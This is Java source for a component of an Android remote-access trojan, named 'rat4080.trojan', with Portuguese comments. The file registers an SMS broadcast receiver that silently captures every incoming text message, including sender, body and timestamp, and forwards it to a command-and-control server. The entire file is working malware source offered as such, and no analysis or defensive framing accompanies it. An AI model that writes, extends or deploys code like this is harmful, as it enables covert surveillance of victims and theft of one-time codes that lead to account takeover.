package com.rat4080.trojan;

import android.content.*;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONObject;

/**
 * Interceta SMS recebidas e envia para o C2
 */
public class SmsReceiver extends BroadcastReceiver {
    
    private static final String TAG = "Rat4080Sms";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);
                        
                        String sender = message.getDisplayOriginatingAddress();
                        String body = message.getMessageBody();
                        long timestamp = message.getTimestampMillis();
                        
                        Log.i(TAG, "SMS recebida de " + sender + ": " + body);
                        
                        // Envia para o C2
                        MainService service = MainService.getInstance();
                        if (service != null) {
                            JSONObject smsData = new JSONObject();
                            try {
                                smsData.put("sender", sender);
                                smsData.put("body", body);
                                smsData.put("timestamp", timestamp);
                                service.getDataCollector().getC2Client().sendData(
                                    "sms_received", smsData
                                );
                            } catch (Exception e) {
                                Log.e(TAG, "Erro ao enviar SMS: " + e.getMessage());
                            }
                        }
                    }
                }
            }
        }
    }
}
